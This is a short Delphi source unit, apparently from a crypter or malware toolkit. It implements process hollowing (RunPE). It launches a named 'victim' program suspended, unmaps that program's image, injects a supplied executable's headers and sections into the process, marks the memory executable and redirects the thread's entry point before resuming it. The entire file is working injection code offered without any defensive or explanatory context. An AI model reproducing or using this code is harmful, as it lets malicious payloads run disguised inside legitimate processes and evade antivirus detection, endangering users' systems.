unit uRunPE;

interface

uses Windows;

type
  TByteArray = array of Byte;

function RunEXE(sVictim:string; bFile:TByteArray):Boolean;
function NtUnmapViewOfSection(ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll';

implementation

procedure Move(Destination, Source: Pointer; dLength:Cardinal);
begin
  CopyMemory(Destination, Source, dLength);
end;

function RunEXE(sVictim:string; bFile:TByteArray):Boolean;
var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;
  PI:         TProcessInformation;
  SI:         TStartUpInfo;
  CONT:       TContext;
  ImageBase:  Pointer;
  Ret:        DWORD;
  i:          integer;
  Addr:       DWORD;
  dOffset:    DWORD;
begin
  Result := FALSE;
  try
    Move(@IDH, @bFile[0], 64);
    if IDH.e_magic = IMAGE_DOS_SIGNATURE then
    begin
      Move(@INH, @bFile[IDH._lfanew], 248);
      if INH.Signature = IMAGE_NT_SIGNATURE then
      begin
        FillChar(SI, SizeOf(TStartupInfo),#0);
        FillChar(PI, SizeOf(TProcessInformation),#0);
        SI.cb := SizeOf(TStartupInfo);
        if CreateProcess(nil, PChar(sVictim), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then
        begin
          CONT.ContextFlags := CONTEXT_FULL;
          if GetThreadContext(PI.hThread, CONT) then
          begin
            ReadProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @Addr, 4, Ret);
            NtUnmapViewOfSection(PI.hProcess, @Addr);
            ImageBase := VirtualAllocEx(PI.hProcess, Ptr(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
            WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
            dOffset := IDH._lfanew + 248;
            for i := 0 to INH.FileHeader.NumberOfSections - 1 do
            begin
              Move(@ISH, @bFile[dOffset + (i * 40)], 40);
              WriteProcessMemory(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
              VirtualProtectEx(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, @Addr);
            end;
            WriteProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @ImageBase, 4, Ret);
            CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
            SetThreadContext(PI.hThread, CONT);
            ResumeThread(PI.hThread);
            Result := TRUE;
          end;
        end;
      end;
    end;
  except
    CloseHandle(PI.hProcess);
    CloseHandle(PI.hThread);
  end;
end;

end.